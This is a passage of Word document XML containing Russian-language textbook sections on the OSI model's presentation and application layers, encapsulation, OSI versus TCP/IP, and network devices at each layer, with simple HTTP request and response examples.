        <w:t>кодированием</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>шифрованием</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сжатием</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кодирование**: преобразование текста (ASCII, UTF-8), изображений (JPEG, PNG), видео (MPEG, H.264)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: SSL/TLS (HTTPS), SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие**: уменьшение размера данных (gzip, Deflate)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Форматы данных**: ASCII, EBCDIC, UTF-8, JPEG, MPEG, GIF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: SSL/TLS (для HTTPS), SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие**: gzip (для HTTP), MPEG (для видео)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Уровень представления — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>переводчик</w:t>
      </w:r>
      <w:r>
        <w:t>. Если один говорит по-русски, а другой по-английски, переводчик преобразует сообщения так, чтобы оба поняли.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1 (кодирование)</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты пишешь сообщение "Привет" в браузере. Браузер преобразует его в UTF-8: `D0 9F D1 80 D0 B8 D0 B2 D0 B5 D1 82` (байты). Сервер получает байты и декодирует обратно в текст.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2 (шифрование)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты заходишь на `https://google.com`. Твой браузер и сервер Google используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TLS (Transport Layer Security)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для шифрования трафика. Уровень представления шифрует данные перед отправкой и расшифровывает при получении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3 (сжатие)</w:t>
      </w:r>
      <w:r>
        <w:t>: Сервер отправляет HTML-страницу размером 100 КБ. Уровень представления сжимает её до 20 КБ (gzip). Браузер получает сжатые данные и распаковывает их.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем отдельный уровень?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В TCP/IP этого уровня тоже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (шифрование делает TLS, кодирование — само приложение). Но в OSI решили выделить это в отдельный уровень для универсальности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Неправильная кодировка** → кракозябры вместо текста (помнишь главу 1.04?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слабое шифрование** → данные перехватываются (например, старые версии SSL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.8. Уровень 7: Прикладной (Application Layer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Предоставляет сетевые услуги </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приложениям пользователя</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (браузер, почта, FTP-клиент).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Взаимодействие с пользователем**: HTTP (веб), SMTP (почта), FTP (файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обмен данными между приложениями**: DNS (разрешение доменов), DHCP (получение IP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: HTTP, HTTPS, FTP, SMTP (почта), POP3/IMAP (получение почты), DNS, SSH, Telnet, SNMP (управление сетью)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Приложения**: браузер (Chrome, Firefox), почтовый клиент (Outlook, Thunderbird), FTP-клиент (FileZilla)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Прикладной уровень — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>само приложение</w:t>
      </w:r>
      <w:r>
        <w:t>, с которым ты взаимодействуешь (браузер, мессенджер, игра).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты вводишь в браузере `https://google.com` и нажимаешь Enter. Что происходит на прикладном уровне?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS-запрос**: Браузер спрашивает DNS-сервер: "Какой IP у `google.com`?" → Ответ: `142.250.185.46`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP-запрос**: Браузер отправляет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   GET / HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Host: google.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   User-Agent: Mozilla/5.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Accept: text/html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP-ответ**: Сервер Google отвечает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   HTTP/1.1 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Content-Type: text/html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Content-Length: 12345</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;html&gt;&lt;body&gt;...&lt;/body&gt;&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер рендерит HTML-страницу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы на этом уровне</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимости в протоколах** → SQL-инъекции, XSS (для веб-приложений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг** → поддельные сайты (например, `g00gle.com` вместо `google.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-атаки на уровне приложений** → перегрузка сервера запросами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.9. Инкапсуляция и декапсуляция: матрёшка данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инкапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оборачивания данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> заголовками на каждом уровне при отправке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Декапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разворачивания заголовков</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на каждом уровне при получении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Отправка данных (инкапсуляция, сверху вниз)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ты отправляешь HTTP-запрос на `google.com`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 7 (Application)**: Браузер формирует HTTP-запрос: `GET / HTTP/1.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 6 (Presentation)**: (обычно ничего не делает, или шифрует через TLS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 5 (Session)**: (обычно ничего не делает, или управляет сессией)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 4 (Transport)**: TCP добавляет заголовок (Source Port: 54321, Destination Port: 443) → **Сегмент**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 3 (Network)**: IP добавляет заголовок (Source IP: `192.168.1.100`, Destination IP: `142.250.185.46`) → **Пакет**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 2 (Data Link)**: Ethernet добавляет заголовок (Source MAC, Destination MAC) и CRC → **Кадр**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 1 (Physical)**: Кадр преобразуется в биты и передаётся по кабелю → **Биты**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема инкапсуляции</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Уровень 7] Данные (HTTP-запрос)</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t>[Уровень 4] [TCP-заголовок] [Данные] ← Сегмент</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t>[Уровень 3] [IP-заголовок] [TCP-заголовок] [Данные] ← Пакет</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t>[Уровень 2] [Ethernet-заголовок] [IP-заголовок] [TCP-заголовок] [Данные] [CRC] ← Кадр</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t>[Уровень 1] 010110110101... ← Биты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Получение данных (декапсуляция, снизу вверх)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сервер Google получает пакет:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 1 (Physical)**: Биты преобразуются в кадр</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 2 (Data Link)**: Ethernet проверяет CRC (контрольная сумма) и MAC-адрес → убирает Ethernet-заголовок → передаёт пакет выше</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 3 (Network)**: IP проверяет Destination IP → убирает IP-заголовок → передаёт сегмент выше</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 4 (Transport)**: TCP проверяет порт (443 = HTTPS) → убирает TCP-заголовок → передаёт данные приложению</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 7 (Application)**: Веб-сервер получает HTTP-запрос и формирует ответ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: Инкапсуляция — это упаковка подарка: ты кладёшь игрушку в коробку, коробку в бумагу, бумагу в пакет, пакет в машину. Декапсуляция — это распаковка: получатель достаёт пакет из машины, снимает бумагу, открывает коробку, видит игрушку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.10. OSI vs TCP/IP: теория против практики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему OSI не победил?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Слишком сложная**: 7 уровней вместо 4, много абстрактных концепций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поздно появилась**: TCP/IP уже работал в интернете (ARPANET), когда OSI был только на бумаге</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Плохая реализация**: протоколы OSI (X.25, X.400) были медленными и неудобными</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Победа прагматизма**: TCP/IP был проще, быстрее, бесплатнее</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение OSI и TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| OSI | TCP/IP | Примеры протоколов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|--------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7. Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | HTTP, HTTPS, FTP, SMTP, DNS, SSH |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6. Presentation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | (часть Application) | SSL/TLS, JPEG, MPEG, UTF-8 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | (часть Application) | NetBIOS, RPC, SIP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Transport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Transport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | TCP, UDP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Network</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Internet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | IP (IPv4, IPv6), ICMP, ARP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Data Link</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Network Access</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Ethernet, Wi-Fi, PPP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Physical</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | (часть Network Access) | Кабели, хабы, радиоволны |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые отличия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество уровней**: OSI = 7, TCP/IP = 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровни 5-7 в OSI** (Session, Presentation, Application) в TCP/IP объединены в один уровень Application</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровни 1-2 в OSI** (Physical, Data Link) в TCP/IP объединены в Network Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**OSI — теоретическая модель** (для обучения), **TCP/IP — практическая реализация** (для реальных сетей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что используют на практике?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Протоколы**: TCP/IP (HTTP, TCP, IP, Ethernet)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Терминология**: OSI (говорят "это протокол уровня 3" вместо "это протокол Internet Layer")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Мы используем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>протоколы TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но описываем их </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>терминологией OSI</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.11. Устройства на разных уровнях OSI</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сетевые устройства работают на разных уровнях модели OSI:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Уровень OSI | Устройства | Что делают |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-----------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Physical</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Хаб (Hub), Репитер (Repeater), Кабели | Передают биты, усиливают сигнал, не понимают данные |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Data Link</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Свитч (Switch), Мост (Bridge), Точка доступа Wi-Fi (AP) | Коммутируют кадры по MAC-адресам, работают в локальной сети |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Network</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Роутер (Router), Layer 3 Switch | Маршрутизируют пакеты по IP-адресам между сетями |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Transport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | (нет физических устройств) | TCP/UDP работают в ОС на хостах |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5-7. Session/Presentation/Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Файрволл (Firewall), Прокси-сервер (Proxy), Load Balancer | Фильтруют трафик, кэшируют, распределяют нагрузку |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Подробнее</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уровень 1: Хаб (Hub)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Получает биты на один порт → пересылает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> портам (broadcast).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Коллизии (два устройства отправляют одновременно → сигналы накладываются). Хабы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>устарели</w:t>
      </w:r>
      <w:r>
        <w:t>, их заменили свитчи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
